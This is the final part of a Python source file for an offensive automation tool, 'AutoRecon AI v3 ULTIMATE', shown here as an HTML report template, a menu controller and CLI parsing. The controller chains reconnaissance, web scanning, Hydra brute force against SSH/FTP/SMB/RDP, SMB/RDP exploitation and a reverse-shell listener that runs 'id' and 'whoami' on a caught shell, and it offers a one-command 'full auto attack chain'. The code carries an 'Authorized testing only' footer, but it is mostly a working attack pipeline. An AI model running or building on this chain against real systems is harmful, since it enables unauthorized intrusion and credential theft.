table {{ width:100%;border-collapse:collapse; }}
th {{ text-align:left;padding:10px 8px;color:#00ff88;border-bottom:2px solid #333366; }}
td {{ padding:8px;border-bottom:1px solid #1a1a3e; }}
.sub-item {{ padding:6px;margin:2px 0;background:#1a1a3e;border-radius:4px;font-size:13px; }}
.footer {{ text-align:center;padding:20px;color:#555;font-size:13px; }}
</style>
</head>
<body>
<div class="header">
    <h1>☠️ AutoRecon AI v3 — ULTIMATE</h1>
    <p class="meta">Target: {html.escape(hostname)} ({', '.join(intel.get('ips',['N/A']))}) | {timestamp.strftime('%Y-%m-%d %H:%M:%S')} | {duration:.1f}s</p>
    <div style="margin-top:16px"><span class="badge">{risk} RISK — Score: {risk_score}/100</span></div>
</div>
<div class="container">
    <div class="card">
        <h2>📊 Overview</h2>
        <div class="stats">
            <div class="stat-box"><div class="stat-num">{len(ports)}</div><div class="stat-label">Open Ports</div></div>
            <div class="stat-box"><div class="stat-num">{len(subs)}</div><div class="stat-label">Subdomains</div></div>
            <div class="stat-box"><div class="stat-num">{len(dirs)}</div><div class="stat-label">Directories</div></div>
            <div class="stat-box"><div class="stat-num">{len(web_findings)}</div><div class="stat-label">Findings</div></div>
        </div>
    </div>
    <div class="card"><h2>🔌 Open Ports ({len(ports)})</h2>
        <table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody>{ports_rows if ports_rows else '<tr><td colspan="3">No open ports</td></tr>'}</tbody></table>
    </div>
    {f'<div class="card"><h2>🌐 Subdomains ({len(subs)})</h2>{subs_html}</div>' if subs_html else ''}
    {f'<div class="card"><h2>📁 Directories ({len(dirs)})</h2>{dirs_html}</div>' if dirs_html else ''}
    {f'<div class="card"><h2>💉 Web Vulnerabilities ({len(web_findings)})</h2>{findings_html}</div>' if findings_html else ''}
    {f'<div class="card"><h2>🔓 Credentials Found ({len(creds)})</h2>{creds_html}</div>' if creds_html else ''}
    {f'<div class="card"><h2>💥 Exploitation Results ({len(exploits)})</h2>{exploits_html}</div>' if exploits_html else ''}
    <div class="card"><h2>🛡️ Recommendations</h2><ol style="padding-left:20px;line-height:1.8">
        {('<li>Close unnecessary open ports</li>' if len(ports)>5 else '')}
        {('<li>Fix SQL injection vulnerabilities</li>' if any(f.get("type")=="sqli" for f in web_findings) else '')}
        {('<li>Fix XSS vulnerabilities</li>' if any(f.get("type")=="xss" for f in web_findings) else '')}
        {('<li>Add missing security headers</li>' if any(f.get("type")=="missing_header" for f in web_findings) else '')}
        {('<li>Patch SMB and RDP vulnerabilities!</li>' if exploits else '')}
        {('<li>Use stronger passwords</li>' if creds else '')}
        <li>Regular security assessments & updates</li>
    </ol></div>
</div>
<div class="footer">AutoRecon AI v3.0 ULTIMATE | ANKIT48274 | Authorized testing only!</div>
</body></html>"""

        with open(filename,"w") as f: f.write(html_content)
        ok(f"📊 Report: {filename}")
        return filename


# ═══════════════════════════════════════════════════════════════
#  6. MAIN CONTROLLER
# ═══════════════════════════════════════════════════════════════

class AutoReconV3:
    def __init__(self):
        self.target = ""
        self.intel = {}
        self.web_findings = []
        self.credentials = []
        self.exploits = []
        self.start_time = 0
        self.lhost = ""
        self.lport = 4444

    def show_banner(self):
        print(BANNER_V3)
        available = sum(1 for v in TOOLS.values() if v)
        print(f"  {DIM}Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Kali Tools: {available}{RS}\n")

    def show_menu(self):
        menu = f"""
    {C}{BD}[1]{RS} 🕵️  {BD}FULL RECON{RS}     — Subdomains, Ports, DNS, WHOIS, Directories
    {C}{BD}[2]{RS} 🌐  {BD}WEB SCAN{RS}        — SQLi, XSS, Nikto, Headers
    {C}{BD}[3]{RS} 🔓  {BD}BRUTE FORCE{RS}     — Hydra SSH/FTP/HTTP/SMB/RDP
    {C}{BD}[4]{RS} 💥  {BD}EXPLOIT{RS}          — SMB, RDP, Searchsploit, Payloads
    {C}{BD}[5]{RS} 🎧  {BD}LISTENER{RS}         — Reverse shell handler
    {C}{BD}[6]{RS} 🔥  {BD}FULL AUTO{RS}        — 1→2→3→4 (Complete chain!)
    {C}{BD}[7]{RS} 🧠  {BD}AI DEEP{RS}          — Claude/OpenAI API analysis
    {C}{BD}[0]{RS} ❌  {BD}EXIT{RS}
"""
        if console:
            console.print(Panel(menu, title="☠️ AutoRecon v3 ULTIMATE", border_style="red"))
        else:
            print(menu)

    def get_lhost(self):
        if not self.lhost:
            self.lhost = input(f"  {Y}LHOST (your IP for rev shells):{RS} ").strip()
        return self.lhost

    def target_setup(self):
        if not self.target:
            t = input(f"\n  {Y}🎯 Target (domain/IP):{RS} ").strip()
            if not t: return False
            self.target = t
        return True

    def run_recon(self):
        if not self.target_setup(): return
        section("🕵️ PHASE 1: INTELLIGENCE GATHERING")
        info(f"Target: {self.target}")
        choices = f"\n    {C}1{RS} Quick\n    {C}2{RS} Full\n    {C}3{RS} Vuln Scan\n    {C}4{RS} Stealth\n"
        print(choices)
        choice = input(f"  {Y}Mode [1]:{RS} ").strip() or "1"
        mode_map = {"1":"quick","2":"full","3":"vuln","4":"stealth"}
        gatherer = IntelligenceGatherer(self.target)
        self.intel = gatherer.gather_all(mode_map.get(choice,"quick"))
        ok("Phase 1 complete!")

    def run_web_scan(self):
        if not self.intel:
            warn("Run recon first!")
            return
        section("🌐 PHASE 2: WEB VULNERABILITY SCAN")
        scanner = WebVulnScanner(self.target, self.intel)
        self.web_findings = scanner.scan_all()
        critical = [f for f in self.web_findings if f.get("severity") in ("CRITICAL","HIGH")]
        ok(f"Web scan complete! {len(critical)} critical/high findings")

    def run_bruteforce(self):
        if not self.intel:
            warn("Run recon first!")
            return
        section("🔓 PHASE 3: BRUTE FORCE")
        us = input(f"  {Y}Usernames (comma-sep) [admin]:{RS} ").strip()
        usernames = [u.strip() for u in us.split(",")] if us else ["admin"]
        engine = BruteForceEngine(self.target, self.intel.get("ports", []), usernames[0])
        self.credentials = engine.brute_force_all(usernames)
        ok(f"Brute force done! Found {len(self.credentials)} creds")

    def run_exploit(self):
        if not self.intel:
            warn("Run recon first!")
            return
        section("💥 PHASE 4: EXPLOITATION")
        lhost = self.get_lhost()
        engine = ExploitationEngine(self.target, self.intel.get("ports", []), self.credentials)
        self.exploits = engine.exploit_all(lhost)
        if self.exploits:
            ok(f"Exploitation successful! Shells: {len(self.exploits)}")
        else:
            info("No automatic exploitation (manual testing needed)")

    def run_listener(self):
        section("🎧 REVERSE SHELL LISTENER")
        port = input(f"  {Y}Listen port [4444]:{RS} ").strip() or "4444"
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", int(port)))
            srv.listen(1)
            srv.settimeout(60)
            info(f"Listening on 0.0.0.0:{port}... (60s timeout)")
            conn, addr = srv.accept()
            ok(f"SHELL FROM {addr[0]}:{addr[1]}!")
            conn.send(b"id\n")
            data = conn.recv(1024).decode(errors='replace')
            info(f"Response: {data.strip()}")
            conn.send(b"whoami\n")
            data2 = conn.recv(1024).decode(errors='replace')
            info(f"User: {data2.strip()}")
            conn.close()
        except socket.timeout:
            warn("No connection received")
        except Exception as e:
            warn(f"Listener error: {e}")

    def run_full_auto(self):
        section("🔥 FULL AUTO ATTACK CHAIN")
        self.run_recon()
        if self.intel.get("ports"):
            self.run_web_scan()
            self.run_bruteforce()
            self.run_exploit()
        self.run_report()

    def run_report(self):
        if not self.start_time: self.start_time = time.time()
        duration = time.time() - self.start_time
        section("📊 GENERATING REPORT")
        ReportGenerator.generate(self.intel, self.web_findings, self.credentials, self.exploits, duration)
        ok("Report generated!")

    def run_ai_deep(self):
        section("🧠 AI DEEP ANALYSIS")
        try:
            from ai_api import AIAPIAnalyzer, APIConfig
            providers = APIConfig.get_available_providers()
            if not providers:
                warn("No AI API keys set! export ANTHROPIC_API_KEY=sk-ant-...")
                return
            info(f"AI Provider: {providers[0]}")
            if not self.intel:
                warn("Run recon first!")
                return
            analyzer = AIAPIAnalyzer()
            result = analyzer.enhance_findings(self.web_findings, self.intel)
            if "error" in result:
                err(f"AI Error: {result['error']}")
                return
            ok(f"AI Risk: {result.get('ai_risk_level','N/A')} ({result.get('ai_risk_score','N/A')}/100)")
            if result.get("summary"):
                print(f"\n  📝 {result['summary'][:300]}")
            recs = result.get("recommendations",[])
            if recs:
                print(f"\n  🛡️  Recommendations:")
                for r in recs[:5]:
                    print(f"     • {r[:120]}")
            ai_file = f"{OUTPUT_DIR}/ai_analysis.json"
            with open(ai_file,"w") as f: json.dump(result,f,indent=2,default=str)
            ok(f"AI report: {ai_file}")
        except ImportError:
            err("ai_api.py not found!")

    def run(self):
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self.start_time = time.time()
        self.show_banner()
        while True:
            self.show_menu()
            choice = input(f"  {M}Choice [0-7]:{RS} ").strip()
            print()
            if choice == "0":
                ok("Stay stealthy! 🚀")
                break
            elif choice == "1": self.run_recon()
            elif choice == "2": self.run_web_scan()
            elif choice == "3": self.run_bruteforce()
            elif choice == "4": self.run_exploit()
            elif choice == "5": self.run_listener()
            elif choice == "6": self.run_full_auto()
            elif choice == "7": self.run_ai_deep()
            else: err("Invalid choice!")
            print()


# ═══════════════════════════════════════════════════════════════
#  CLI ARGUMENTS
# ═══════════════════════════════════════════════════════════════

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(prog="autorecon-v3",description="☠️ AutoRecon AI v3 ULTIMATE")
    parser.add_argument("-t","--target",help="Target domain/IP")
    parser.add_argument("-m","--mode",choices=["recon","web","brute","exploit","full","auto"],default="auto")
    parser.add_argument("--lhost",help="Your IP for reverse shells")
    parser.add_argument("--lport",type=int,default=4444)
    parser.add_argument("--user",help="Username for brute force")
    parser.add_argument("--quick",action="store_true",help="Quick mode")
    parser.add_argument("--version",action="version",version="AutoRecon AI v3.0 ULTIMATE")
    return parser.parse_args()


def main():
    args = parse_args()
    try:
        app = AutoReconV3()
        if args.target:
            app.target = args.target
            app.lhost = args.lhost or ""
            if args.mode == "auto": app.run_full_auto()
            elif args.mode == "recon": app.run_recon(); app.run_report()
            elif args.mode == "web": app.run_recon(); app.run_web_scan(); app.run_report()
            elif args.mode == "brute": app.run_recon(); app.run_bruteforce(); app.run_report()
            elif args.mode == "exploit": app.run_recon(); app.run_exploit(); app.run_report()
            elif args.mode == "full": app.run_recon(); app.run_web_scan(); app.run_bruteforce(); app.run_exploit(); app.run_report()
            if not app.intel: app.run_report()
        else:
            app.run()
    except KeyboardInterrupt:
        print(f"\n{R}Interrupted{RS}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}Fatal: {e}{RS}")
        sys.exit(1)


if __name__ == "__main__":
    main()
